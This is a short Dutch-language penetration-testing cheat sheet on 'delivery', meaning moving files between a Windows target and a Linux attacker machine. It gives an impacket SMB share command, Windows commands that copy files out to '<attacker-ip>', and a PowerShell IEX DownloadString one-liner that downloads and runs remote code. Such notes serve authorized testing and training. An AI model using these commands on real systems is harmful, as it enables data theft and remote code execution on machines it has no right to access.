## Delivery

### Overzicht

Het overbrengen van bestanden en/of folders via een transfer systeem, waardoor het leveren van bestanden makkelijker wordt.

### Windows naar Linux

#### SMB

**1. Linux Opzet**

```
impacket-smbserver /<sharename> /<folder-to-user> -ip <attacker-ip> -u 'Guest' -p 'Password123!' --smb2support 
```

**2. Windows Opzet**

```
net use \\<attacker-ip>\<sharename> -Username 'Guest':'Password123!'
copy <filename.ext> \\<attacker-ip>\<sharename>\<filename.ext>
```

*Other ways of delivering*

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://<ip>:<port>/<file.extension>');"
```

**3. Bestand**

Bestand zal zich bevinden in de <folder-to-use> -> attacker machine, waar dit was gedefinieerd in stap 1. 

Dit kan alleen via de shell van windows naar linux.

